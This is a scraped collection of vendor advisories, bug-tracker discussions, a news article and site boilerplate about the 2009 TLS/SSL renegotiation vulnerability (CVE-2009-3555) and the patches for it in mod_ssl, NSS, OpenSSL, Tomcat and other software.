<http://www.apache.org/dist/httpd/patches/apply_to_2.2.14/CVE-2009-3555-2.2.patch>  This change is planned to be included in the upcoming httpd updates.  It resolves the problem for majority of HTTPS sites, but does not completely resolve the issue in deployments where server-initiated renegotiations are used (client certificates or different cipher suites required for some parts of the web site, but not required on the initial connection, see [comment #4](show_bug.cgi?id=533125#c4)).   ```  [Comment 24](show_bug.cgi?id=533125#c24)  Joe Orton    2009-11-11 09:43:05 UTC  ``` Rick -  We looked into SGC last week but weren't be totally sure about what happens - my reading of the OpenSSL code indicated it might be OK.  I've now found a description of the SGC protocol in EKR's book.  The "Step-Up" protocol will not work with the patched server (at least mod_ssl) because it requires a renegotiation.  The "SGC" protocol is different; in that case the client never completes the first handshake, but simply starts a new one with a new ClientHello after receiving the ServerHello with a cert advertising SGC support.  As far as I can tell that should still work with the patched server.  If someone from a friendly CA could give us an SGC test cert we might be able test it out ;) (generating a test cert looked to be hard because the browsers restrict SGC support to specific CA roots)   ```  [Comment 25](show_bug.cgi?id=533125#c25)  Tomas Hoger    2009-11-11 10:56:21 UTC  ``` Unlike OpenSSL or NSS, GnuTLS does not handle renegotiation transparently for applications.  GNUTLS_E_REHANDSHAKE error code is returned instead requiring application to handle the renegotiation.  There are currently no known server applications using GnuTLS that have renegotiation handling implemented.  For further details, see the discussion on the gnutls-dev mailing list:  <http://lists.gnu.org/archive/html/gnutls-devel/2009-11/msg00043.html>   ```  [Comment 26](show_bug.cgi?id=533125#c26)  Rick Andrews    2009-11-11 17:42:17 UTC  ``` (In reply to [comment #24](show_bug.cgi?id=533125#c24)) > As far as I can tell that should still work with the patched server.

No, current versions do not provide a way to disable renegotiations without modifications of the library, or applications using it (as was done for mod_ssl).   New OpenSSL version 0.9.8l was released disabling all renegotiations. There's no official Red Hat update providing similar fix available at the moment.  Why?  There are several reasons for that: - Upstream fix disables all renegotiations even though it is known to   break valid uses where renegotiations are required (e.g. certain    mod_ssl setups).  That is clearly stated in the "Workaround" section   of the OpenSSL advisory:      <http://www.openssl.org/news/secadv_20091111.txt>   Servers that need renegotiation to function correctly obviously cannot   deploy this fix without breakage.    - Upstream fix in 0.9.8l does not provide a way to re-enable   renegotiations without modifying application.  Post-0.9.8l versions   even use different way to re-enable renegotiations.    - Upstream fix introduces unexpected behavior in some cases, client   renegotiation request is never replied by the server instead of   causing the server to report handshake failure.    Due to these reasons, we do not plan to use patch included in 0.9.8l in the Red Hat Security Advisories.   Does Red Hat plan to release NSS update that disables all renegotiations?  We're considering this.  Unlike OpenSSL, NSS has a tradition of using environment variables to control its features.  Therefore, it's  possible to disable renegotiations by default and re-enable them only for certain applications via certain environment variables.    Is there any time line for the final fix?  Unfortunately, there's no fixed time line for the final fix implementing TLS renegotiation extension.  The extension is still being discussed by the IETF TLS working group and its implementations are in progress.   ```  [Comment 38](show_bug.cgi?id=533125#c38)  Tomas Hoger    2009-11-19 20:20:22 UTC  ``` Similar mitigation fix as mention for mod_ssl in [comment #23](show_bug.cgi?id=533125#c23) was applied in tomcat-native SVN:   <http://svn.apache.org/viewvc?view=revision&revision=835322>   <http://svn.apache.org/viewvc?view=revision&revision=835335>   ```  [Comment 40](show_bug.cgi?id=533125#c40)  Vincent Danen    2009-11-27 21:19:26 UTC  ``` The patch for nginx is here: <http://sysoev.ru/nginx/patch.cve-2009-3555.txt>   ```  [Comment 42](show_bug.cgi?id=533125#c42)  Nelson Bolyard    2009-12-04 21:40:55 UTC  ``` In reply to [comment 23](show_bug.cgi?id=533125#c23): > A mitigation patch was created for mod_ssl, which rejects all  > client-initiated renegotiation requests:  Given that Marsh Ray's attach works equally well with client-initiated  renegotiations and server-initiated renegotiations, why is it thought  that disabling only client-initiated renegotiations is an effective  mitigation to this vulnerability?   ```  [Comment 43](show_bug.cgi?id=533125#c43)  Joe Orton    2009-12-07 12:47:48 UTC  ``` (In reply to [comment #42](show_bug.cgi?id=533125#c42)) > Given that Marsh Ray's attach works equally well with client-initiated  > renegotiations and server-initiated renegotiations, why is it thought  > that disabling only client-initiated renegotiations is an effective  > mitigation to this vulnerability?    The patch deployed will fix the vulnerability for any configuration which does not require server-initiated renegotiation.  The majority of mod_ssl configurations do not require server-initiated renegotiation.

The APR connector relies on OpenSSL, and is vulnerable if the version of OpenSSL is vulnerable.  NIO (non-blocking IO) and BIO (blocking IO) connectors use the JSSE implementation of the underlying JRE.   The NIO connector is not affected, as it does not support renegotiation.  To workaround the vulnerability within tomcat until a fix for JSSE is available, the BIO connector configuration offers a "allowUnsafeLegacyRenegotiation" attribute from Tomcat 6.0.21 onwards. The default value "false" protects against the vulnerability.   <http://tomcat.apache.org/security-5.html#Not%20a%20vulnerability%20in%20Tomcat> <http://tomcat.apache.org/security-6.html#Not%20a%20vulnerability%20in%20Tomcat>   ```  [Comment 46](show_bug.cgi?id=533125#c46)  Fedora Update System    2009-12-27 20:23:52 UTC  ``` proftpd-1.3.2c-1.fc12 has been pushed to the Fedora 12 stable repository.

## Details

USN-927-1 fixed vulnerabilities in nss in Ubuntu 9.10. This update provides

the corresponding updates for Ubuntu 8.04 LTS.

Original advisory details:

Marsh Ray and Steve Dispensa discovered a flaw in the TLS and SSLv3

protocols. If an attacker could perform a machine-in-the-middle attack at the

start of a TLS connection, the attacker could inject arbitrary content at

the beginning of the user's session. This update adds support for the new

new renegotiation extension and will use it when the server supports it.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## SSL and TLS protocols renegotiation vulnerability

#### Vulnerability Note VU#120541

Original Release Date: 2009-11-11 | Last Revised: 2011-07-22

---

### Overview

A vulnerability exists in SSL and TLS protocols that may allow attackers to execute an arbitrary HTTP transaction.

### Description

| The Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols are commonly used to provide authentication, encryption, integrity, and non-repudiation services to network applications such as HTTP, IMAP, POP3, LDAP. A vulnerability in the way SSL and TLS protocols allow renegotiation requests may allow an attacker to inject plaintext into an application protocol stream. This could result in a situation where the attacker may be able to issue commands to the server that appear to be coming from a legitimate source. According to the [Network Working Group](https://svn.resiprocate.org/rep/ietf-drafts/ekr/draft-rescorla-tls-renegotiate.txt):  *The server treats the client's initial TLS handshake as a renegotiation and thus believes that the initial data transmitted by the attacker is from the same entity as the subsequent client data.*This issue affects SSL version 3.0 and newer and TLS version 1.0 and newer. |
| --- |

### Impact

| A remote, unauthenticated attacker may be able to inject an arbitrary amount of chosen plaintext into the beginning of the application protocol stream. This could allow and attacker to issue HTTP requests, or take action impersonating the user, among other consequences. |
| --- |

### Solution

| Users should contact vendors for specific patch information. |

# Indiscreet tweet trips awareness of Web SSL vulnerability

Internet security engineers who had been meeting secretly to discuss a possible extension to Transport Layer Security (TLS) to thwart a possible low-level exploit, were compelled yesterday to reveal the existence of their meetings after another security engineer unconnected to their project went public with a conceptual framework of the very type of exploit they were working to pre-emptively patch.

The problem is essentially a repeat of what developers of TLS and its parent protocol, Secure Sockets Layer (SSL), have dealt with a handful of times in the past: the potential of man-in-the-middle attacks by malicious servers that can pass themselves off as security authenticators. As the team from [wireless security service provider PhoneFactor](http://www.phonefactor.com/) discovered last August, it was possible using both Microsoft IIS 7.0 and Apache httpd Web servers to demonstrate a situation where a false TLS server authenticates itself to a genuine Web client, then authenticates itself to a genuine TLS server, effectively setting itself up as a go-between that's privy to the complete contents of what appears to the innocent client to be a fully encrypted SSL session.

With online bank transactions worldwide currently covered just with SSL, the potential for global exploit now that the technique behind the attack is widely known, has just become enormous.

As PhoneFactor engineer [Marsh Ray blogged this morning](http://extendedsubset.com/?p=8), he first suspected the possibility of a vulnerability while doing code testing of a product that a PhoneFactor partner was developing to support its software. "We realized this situation needed to be handled with a good measure of care," Ray wrote. "Over the first part of September 2009, we began disclosing the initial group of independent security consultants for independent verification and advice on how to proceed."

With the cooperation of groups such as the Internet Engineering Task Force, a working group was formed with the objective of developing an extension to TLS. Security vendors with representatives to the IETF, Ray implied, are aware of his and supervisor Steve Dispensa's work, so it's likely that remedial code for the problem has already been developed, and is being tested now.

Without divulging the technical details, here is the basic theory of Ray's and Dispensa's discovery: During a typical TLS (SSL) session, a handshaking process initiated by a client results in the legitimate server validating the client's certificate, and the client validating the one passed by the server. From there, an exchange takes place whose result is the production of an exclusive session key. Methods exist for one or the other party to request a change in the parameters of their transactions, perhaps to switch to a different, stronger cipher suite. However, because of the "post-only" nature of HTTP -- the transaction protocol around which the TLS session is based -- moving the session over to the stronger suite cannot mean suspending transactions in progress and picking them back up again later after the move. Instead, the old session is effectively ended and a new one begins.

At least, that's what's supposed to be enabled to happen, and there's where the trouble starts. The old session is ended, but in order to renegotiate the session, the client and server have to start all over again. In a situation similar to someone's e-mail application replying to your e-mail with a message whose subject line begins, **RE:**, the conversation between client and server over what to change to, contains a reference to the request for renegotiation -- the request that had, when sent earlier, been encrypted.

Now it's not, and that's the problem. The certificate chain that had been encrypted is now revealed in clear text; and it becomes possible for a malicious middleman to inject code into that chain. Ray was able to demonstrate the methods to security vendors, and that's where we'll stop before we get too detailed.

On a different IETF mailing list yesterday afternoon, a security researcher with SAP, who was running tests on Microsoft IIS, effectively discovered the same concept, and disclosed his discovery in a responsible manner as well. The problem: Someone reading that mailing list effectively broadcast the news "TLS is cracked," or something to that effect, to all his friends on Twitter.

Apparently last night -- maybe in the middle of the night -- is when Ray and Dispensa began getting phone calls from partners. The news was out, and now the need to keep "Project Mogul" secret had evaporated. Though a solution has already been in the works since at least early September, the race to secure the principal protocol governing the Web's monetary transactions has just kicked into overdrive.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

\*\* This privacy policy is currently being adopted and may not yet be fully implemented at all websites \*\*

This Privacy Policy clarifies the nature, scope and purpose of the processing of personal data
(hereinafter referred to as âDataâ) within our online offering and the related websites, features
and content, as well as external online presence, e.g. our social media profiles on Twitter, Facebook, YouTube and similar sites
(collectively referred to as âonline presenceâ).
With regard to the terminology we use, e.g. âProcessingâ or âResponsibleâ,
we refer to the definitions in Article 4 of the General Data Protection Regulation (GDPR).

## 1. Name and contact details of the controller and the company data protection officer

This privacy policy applies to data processing by:

Responsible:

The Apache Software Foundation

V. P. Data Privacy

1000 N West Street, Suite 1200

Wilmington, DE 19801

U.S.A.

E-Mail: vp-privacy@apache.org

## 2. Collection and storage of personal data and the nature and purpose of their use

### a) When visiting the website

#### Log files

When you visit our websites ([full list of domains](/policies/asf-domains.html)) or one of our subdomains,
the browser on your device automatically sends information to the server of our website.
This information is temporarily stored in a log file.
The following information is being collected without your intervention and stored until automated deletion:

* The IP address of the requesting computer
* The date and time of access
* The name and URL of the retrieved file
* The website from which access is made (referrer URL)
* Geo information of the location from which access is made
* The browser used and, if applicable, the operating system of your computer and the name of your access provider

The data mentioned are processed by us for the following purposes:

* Ensuring connectivity of our website
* Ensuring a use of our website, of which we think is comfortable for you
* Evaluation of system security and stability
* Other administrative purposes

The retention time for this data is 90 days.

The legal basis for data processing is Art. 6 para. 1 p. 1 lit. f GDPR.
Our legitimate interest follows from the data collection purposes listed above.
In no case do we use the collected data for the purpose of drawing conclusions about you.
In addition, we use cookies and analysis services when you visit our website.
Further details can be found under no. 4 and 5 of this privacy policy.

#### Matomo

In addition to log files, some of our websites use Matomo to understand what parts of the
website are important to our users, what features are most frequently accessed,
where users get lost in the documentation, etc.
This data allows us to better understand how users use the system, the website,
and the docs and where to focus improvements next.

The collected information consists of the following:

* The IP address from which you access the website
* The type of browser and operating system you use to access our site
* The date and time you access our site
* The pages you visit
* If you click on any of the file download links on our website
* The addresses of pages from where you followed a link to our site
* The addresses of pages you go to from our site
* The search terms you use on the website

This information is gathered and stored using the open source software Matomo. We donât
use any cookies to collect this information. An IP address is anonymized by removing
the last two octets from the IP address. That means that if your IP is 192.168.100.50,
we store it as 192.168.0.0.

Matomo is self-hosted on a virtual machine provided by the Apache Software Foundation.
It can only be accessed by members of the Apache Privacy committee. The data can be
viewed by anyone by visiting https://analytics.apache.org/.

Matomo respects any Do Not Track setting in your browser. You can also opt-out
from all Matomo tracking below.

### b) When registering for our newsletter and mailing lists

If, pursuant to Art. 6 para. 1 sentence 1 lit. a GDPR, you have expressly consented,
we use your e-mail address to periodically send you our newsletter.
For the receipt of the newsletter the indication of an e-mail address is sufficient.

We inform our visitors at regular intervals through newsletters about news and offers from The Apache Software Foundation.

The newsletter of our Foundation can only be received if (1) the data subject has a valid e-mail address and (2) the person concerned registers for the newsletter.
For legal reasons, a confirmation e-mail will be sent to the e-mail address entered by an affected person before the first time of sending the newsletter, using the double-opt-in procedure.
This confirmation email is used to check whether the owner of the e-mail address is the person who authorized the receipt of the newsletter.

When you subscribe to the newsletter, we store the date and time of registration and the email address.
The collection of this data is necessary for us to understand the (possible) misuse of an affected personâs e-mail address at a later date and therefore serves as legal safeguards for the controller.

The personal data collected in the context of registering for the newsletter is used exclusively to send our newsletter.

Subscribers may also be notified by e-mail if this is necessary for the operation of the newsletter service or registration, as might be the case in the event of changes to the newsletter/mailing list or technical changes.

There will be no transfer to third parties of the personal data collected as part of the newsletter service.

Subscription to our newsletter may be terminated by the person concerned at any time.
Consent to the storage of personal data that the person has given us for the newsletter dispatch can be revoked at any time.
For the purpose of revoking the consent, instructions are given by the end of each newsletter email.

### c) When registering for our mailing lists

If, pursuant to Art. 6 para. 1 sentence 1 lit. a GDPR, you have expressly consented, we use your e-mail address to send you messages arriving at our mailing lists.
For the receipt of the mailing list message the indication of an e-mail address is sufficient.

Visitors may communicate with us through our mailing lists.

The mailing list messages of our organisation can only be received if (1) the person concerned has a valid e-mail address and (2) the person concerned registers for the mailing list.
For legal reasons, a confirmation e-mail will be sent to the e-mail address entered by an affected person for the first time using the double-opt-in procedure.
This confirmation email is used to check whether the owner of the e-mail address authorized the receipt of the mailing list messages.

When you subscribe to a mailing list, we store the date and time of registration and the email address.
The collection of this data is necessary for us to understand the (possible) misuse of an affected personâs e-mail address at a later date and therefore serves as legal safeguards for the controller.
When a mailing list is archived, the log file will be deleted.

The personal data collected in the context of registering for a mailing list will be used exclusively to send messages arriving at that mailing list.

Subscribers may also be notified by e-mail if this is necessary for the operation of the mailing list service or registration, as might be the case in the event of changes to the mailing list or other technical changes.

We will not actively transfer to third parties any personal data as part of the mailing list service.
However, almost all of our mailing lists are of a public nature.

This means, your name and email may be exposed to the public.
Also, all information you send to a mailing list will be exposed to the public.
Third parties may collect this information and process it separately.
The sender of messages is responsible if they expose their personal data to the public.

All content sent to mailing lists is archived indefinitely.
By using our mailing list service, you agree that any content is archived in that way.

Subscription to our mailing lists may be terminated by the person concerned at any time.
The consent to the storage of personal data that a person has given us for the mailing list dispatch can be revoked at any time.
For the purpose of revoking the consent, instructions are given by the end of every email.

## 3. Disclosure of data

Transfer of your personal data to third parties for purposes other than those listed below does not take place.
We only share your personal information with third parties if:

* You, in accordance with Art. 6 para. 1 p. 1 lit. a GDPR, have given express consent to this.
* Disclosure pursuant to Art. 6 para. 1 sentence 1 lit. f GDPR is required to assert, exercise or defend legal claims and there is no reason to assume that you have a predominantly legitimate interest in not disclosing your data.
* Disclosure pursuant to Art. 6 para. 1 sentence 1 lit. c GDPR is a legal obligation.
* As permitted by law and according to Art. 6 para. 1 sentence 1 lit. b GDPR, disclosure is required for the settlement of contractual relationships with you.

## 4. External service providers

The Apache Software Foundation uses the following external service providers who help to optimize its services.
Insofar as these service providers process data on behalf of The Apache Software Foundation, agreements have been concluded with them which set the European data protection standards as binding and, in particular, prohibit the use of the data for other purposes.
If we commission third parties to process data on the basis of a so-called âcontract processing contractâ, this is done on the basis of Art. 28 GDPR.

### (a) Hetzner: Hosting

## 5. Social Media Plug-ins

We rely on our website on the basis of Art. 6 para. 1 sentence 1 lit. f GDPR social plug-ins from the social networks Facebook, Twitter and Instagram to make our company better known.
The underlying commercial purpose is to be regarded as a legitimate interest within the meaning of the GDPR.
Responsibility for operation compliant with data protection is to be guaranteed by the respective providers.
The integration of these plug-ins by us is done by means of the so-called two-click method to protect visitors to our website in the best possible way.

### a) YouTube

On our website we have integrated components from YouTube.
YouTube is an internet video portal that allows video publishers to freely watch video clips provided by other users for free viewing, rating and commenting.
YouTube allows the publication of all types of videos, so that both complete film and television broadcasts, music videos, trailers and user-made videos uploaded via the YouTube internet portal are available.

YouTubeâs operating company is YouTube, LLC, 901 Cherry Ave., San Bruno, CA 94066, USA.
YouTube, LLC is a subsidiary of Google Inc., 1600 Amphitheater Pkwy, Mountain View, CA 94043-1351, USA.

Each visit to one of the pages of this site operated by the controller and incorporating a YouTube component (YouTube video) will automatically cause the Internet browser on the subjectâs information technology system to download an illustration of the corresponding YouTube component from YouTube.
More information about YouTube can be found at https://www.youtube.com/yt/about/en/.
As part of this technical process, YouTube and Google are aware of the specific location of our site visited by the person concerned.
If the person visiting our site is logged in to YouTube at the same time, YouTube calls a sub-page containing a YouTube video for the person visiting our site.
This information is collected by YouTube and Google and associated with the individual YouTube account.

YouTube and Google will always receive information through the YouTube component that a person has visited our website if the person is logged into YouTube at the time of access to our website; this happens regardless of whether the person clicks on a YouTube video or not.
If such transmission of this information to YouTube and Google is not wanted by the person visiting our site, they can prevent the transmission by logging out of their YouTube account before visiting our website.

YouTubeâs privacy policy, available at https://www.google.com/intl/en/policies/privacy/, identifies the collection, processing, and use of personally identifiable information by YouTube and Google.

## 8. Right to object

If our retention of your personal data is based on legitimate interests in accordance with Art. 6 para. 1 sentence 1 lit. f GDPR, you have the right to file an objection against the processing of your personal data in accordance with Art. 21 GDPR, provided that there are reasons for this arising from your particular situation or the objection is directed against direct mail.

## 9. Data security

We use the popular SSL (Secure Socket Layer) method during your site visit, in conjunction with the highest level of encryption supported by your browser.
In general, this is a 256-bit encryption.
If your browser does not support 256-bit encryption, we use 128-bit v3 technology instead.
Whether a single page of our website is encrypted is shown by the closed representation of the key or lock icon in the lower status bar of your browser.

We also take appropriate technical and organizational security measures to protect your data against accidental or intentional manipulation, partial or total loss, destruction or unauthorized access by third parties.
Our security measures are continuously improved in line with technological developments.

## 10. Updating and changing this privacy policy

This privacy policy is currently valid and is valid as of 2025-01-16.

As a result of the further development of our website and offers thereof, or due to changed legal or official requirements, it may be necessary to change this privacy policy.

| [Description](/show_bug.cgi?id=545755#c0)• 15 years ago |
|  | |

I'm filing a separate bug for branch-landing, because we want a slightly different mix of patches in comparison to what we do on trunk = mozilla-central.
We'd like to land NSS 3.12.6 as per [bug 527659](/show_bug.cgi?id=527659 "RESOLVED FIXED - Update Mozilla-central to NSS 3.12.6") and necessary configure and PSM makefile tweaks, which includes the patch to disable (NSS-new) support for TLS-compression and the compilation fix for moz-sqlite from [bug 519550](/show_bug.cgi?id=519550 "RESOLVED FIXED - Allow the specification of an alternate library for SQLite") on top of that NSS release.
We'd like to include the error string addition from [bug 540332](/show_bug.cgi?id=540332 "RESOLVED FIXED - Update PSM to include the latest NSS error codes"), however, because of the localization problem on stable branches, we'll potentially land only half of that patch on the stable branch (string error codes yes, human readable strings maybe not).
We'd like to include the patch v6 from [bug 535649](/show_bug.cgi?id=535649 "RESOLVED FIXED - log console warnings regarding CVE-2009-3555 and RFC 5746 (SSL renegotiation)"), however, with a difference in preferences. More specifically, we might not yet want to change the default behaviour regarding renegotiation on old-protocol SSL/TLS sockets. We consider to use:
pref("security.ssl.allow\_unrestricted\_renego\_everywhere\_\_temporarily\_available\_pref", true);
This will still allow any kind of connections, even the few unsafe renegotiations that we're able to detect, but we'll start spamming the error console, reporting the not-yet-upgraded sites to users.
I'll make a combination of patches and attach them.
I'll not ask for reviews of patches, as the patches will be identical besides the two minor changes/omissions. I'll rather ask a PSM peer to state that this procedure is OK for the stable branches.
Dan, Johnathan, I think this is what you consider the reasonable approach, but please let me know if I'm wrong.
Which branches?
I think we want
mozilla-1.9.2 for Firefox 3.6.x
and
mozilla-1.9.1 for Firefox 3.5.x
(which will also affect Thunderbird 3 et. al.)
I believe we're targetting mid-end March, 3.5.9 and 3.6.3

We don't need patch from [bug 519550](/show_bug.cgi?id=519550 "RESOLVED FIXED - Allow the specification of an alternate library for SQLite") on stable branches, because the stable branches don't yet use the moz prefix for sqlite.

I see both 1.9.1 and 1.9.2 have already been upgraded to NSPR 4.8.3, I guess that's sufficient for NSS 3.12.6

Update Mozilla to NSS 3.12.6 (approval collector)
I won't attach the full patch of all NSS changes, it's huge, and it can be easily produced by using "cvs diff", comparing current the proposed NSS tag with the current NSS tag.
On both mozilla-1.9.1 and mozilla-1.9.2 the currently used version is NSS 3.12.4.5
The landing of the final 3.12.6 release will either include a fix to [bug 546389](/show_bug.cgi?id=546389 "RESOLVED FIXED - nsssysinit binary built inside source tree, not objdir"), or I'll add a fix on top of it.

Axel, this is the spin-off from [bug 535649](/show_bug.cgi?id=535649 "RESOLVED FIXED - log console warnings regarding CVE-2009-3555 and RFC 5746 (SSL renegotiation)") and [bug 540332](/show_bug.cgi?id=540332 "RESOLVED FIXED - Update PSM to include the latest NSS error codes"), for stable branches, where we consider to land strings.
See the patches labeled "optional" attached to this bug.
I'm completely neutral whether to land them or not. Landing them is nice, not landing them won't hurt.

If you'd like to see the effect of the missing error string, in comparison to trunk where the string is available, you can visit:
<https://www.startssl.com/logon.ssl>
(on branches will show error code "ssl\_error\_renegotiation\_not\_allowed", but no human readable explanation.)
(Testing ability will go away once that server gets upgraded)

Do we now need to update these patches with 3.12.6-rtm ? or do you want to handle that in a separate patch?

I think your question is, are there changes between NSS 3.12.6 release candidates and NSS 3.12.6 final release that require us to update the PSM code?
No.
Although NSS has changed its default, it doesn't matter for PSM, because PSM overrides the defaults and sets its own desired behaviour explicitly (based on (default) prefs).

The summary of this bug sounds like it covers NSS too, and afaik we are currently using NSS 3.12.6-rc0 (maybe rc1?). Are we going to upgrade to 3.12.6-rtm (rc2) as part of this bug, in a different bug, or not at all?
Also, in order to land in the stable branches we need to change the default for security.ssl.allow\_unrestricted\_renego\_everywhere\_\_temporarily\_available\_pref to true -- we don't want to break any current server uses with the initial landing. Just the console warnings and the ability for people to opt into better security.

I don't propose to land betas or release candidates to stable branches.
Yes, my intention of this bug is to upgrade both NSS to 3.12.6 -final- and in addition take the PSM patch attached.
The 3.12.6 -final- is about to be released today or tomorrow (same as rc2), and I plan to upgrade mozilla-central, first.

The attached patch(es) already do(es) that! :)
The patches attached to this bug are adjusted versions of the mozilla-central patches, adjusted for the stable branches. They change the default pref, they omit the strings.
> Just the console warnings and the ability for people to opt into
> better security.
Yes

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- gnome-screensaver
Pressing the "Return" key repeatedly caused an X error that terminated
gnome-screensaver (CVE-2010-0732).
Affected Products: SLE11, openSUSE 11.0, 11.1, 11.2
- tomcat5, tomcat6
tomcat was updated to fix several security issues:
- CVE-2009-2693, CVE-2009-2902:
Directory traversal vulnerability allowed remote attackers
to create or overwrite arbitrary files/dirs with a specially crafted
WAR file.
- CVE-2009-2901:
When autoDeploy is enabled the autodeployment process deployed
appBase files that remain from a failed undeploy, which might allow
remote attackers to bypass intended authentication requirements
via HTTP requests.
- CVE-2008-5515:
When using the RequestDispatcher method, it was possible for remote
attackers to bypass intended access restrictions and conduct directory
traversal attacks.
Affected Products: SLES9, SLE10-SP2, SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- libtheora
An integer overflow was fixed in libtheora. It could be exploited
remotely to execute arbitrary code (CVE-2009-3389).
Affected Products: SLE11, openSUSE 11.0, 11.1, 11.2
- java-1\_6\_0-sun
Sun Java 6 Update 19 was released to fix a large number of security
issues, including several buffer overflows.
(CVE-2010-0082, CVE-2010-0084, CVE-2010-0085, CVE-2010-0087,
CVE-2010-0088, CVE-2010-0089, CVE-2010-0090, CVE-2010-0091,
CVE-2010-0092, CVE-2010-0093, CVE-2010-0094, CVE-2010-0095,
CVE-2010-0837, CVE-2010-0838, CVE-2010-0839, CVE-2010-0840,
CVE-2010-0841, CVE-2010-0842, CVE-2010-0843, CVE-2010-0844,
CVE-2010-0845, CVE-2010-0846, CVE-2010-0847, CVE-2010-0848,
CVE-2010-0849, CVE-2010-0850).
This update also disables unsafe TLS renegotiations (CVE-2009-3555).
Please refer to the following document for more information:
<http://java.sun.com/javase/javaseforbusiness/docs/TLSReadme.html>
Affected Products: SLE11, openSUSE 11.0, 11.1, 11.2
- samba
With enabled "wide links" samba follows symbolic links on the server
side, therefore allowing clients to overwrite arbitrary files
(CVE-2010-0926). This update changes the default setting to have
"wide links" disabled by default. The new default only works if
"wide links" is not set explicitly in smb.conf.
Due to a race condition in mount.cifs a local attacker could corrupt
/etc/mtab if mount.cifs is installed setuid root. mount.cifs is not
setuid root by default and it's not recommended to change that
(CVE-2010-0547).
Affected Products: SLES9, SLE10-SP2, SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
